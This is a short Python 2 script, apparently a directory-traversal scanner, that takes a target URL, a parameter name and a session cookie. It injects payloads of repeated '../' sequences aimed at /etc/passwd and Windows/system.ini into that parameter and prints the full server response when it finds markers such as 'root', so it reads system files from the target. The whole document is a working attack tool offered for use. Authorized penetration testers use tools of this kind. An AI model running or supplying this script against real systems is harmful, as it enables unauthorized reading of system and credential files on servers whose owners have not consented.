#!/usr/bin/env python
# encoding: utf-8
# author: wangjunhu
import requests
import random
import sys
import urlparse

payloads = '''../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd
../Windows/system.ini
../../Windows/system.ini
../../../Windows/system.ini
../../../../Windows/system.ini
../../../../../Windows/system.ini
../../../../../../Windows/system.ini
../../../../../../../Windows/system.ini
../../../../../../../../Windows/system.ini
../../../../../../../../../Windows/system.ini
../../../../../../../../../../Windows/system.ini
../../../../../../../../../../../Windows/system.ini'''.split('\n')

strings = '''root
drivers
timer
wave'''.split('\n')


def scan(url, para, cookie):
    exit = 0
    # 将cookie转化成字典类型
    coo = cookie
    cookie_dict = {i.split("=")[0]: i.split("=")[-1]
                   for i in coo.split(";")}

    try:
        for payload in payloads:
            UR = urlparse.urlparse(url)
            paras_dic = {i.split("=")[0]: i.split("=")[-1]
                         for i in UR.query.split("&")}
            paras_dic[para] = payload
            parameter = ''
            for p in paras_dic:
                parameter += p + '=' + paras_dic[p] + '&'
            parameters = parameter.strip('&')

            URL = UR.scheme + '://' + UR.netloc + UR.path + \
                UR.params + '?' + parameters + UR.fragment
            # print(URL)

            #print ("Scaning The URL:" + URL + '\n')
            content = requests.get(URL, cookies=cookie_dict)
            # print content.text

            for str in strings:

                if str in content.text:

                    print '\n' + 'The Vulu is Exit,Read File:' + '\n\n' + content.text
                    exit = 1
                    break
            if exit == 1:
                break

    except Exception as e:
        raise e


if __name__ == '__main__':
    print 'Welcome Diretory-Traversal To Scan!\n'
    url = raw_input('请输入测试的URL:')
    para = raw_input('请输入测试的参数:')
    cookie = raw_input('请输入系统的COOKIE:')
    print '\n'
    try:
        scan(url, para, cookie)
    except Exception as e:
        raise e
    print '\n\n' + "The Scan Is Over!"
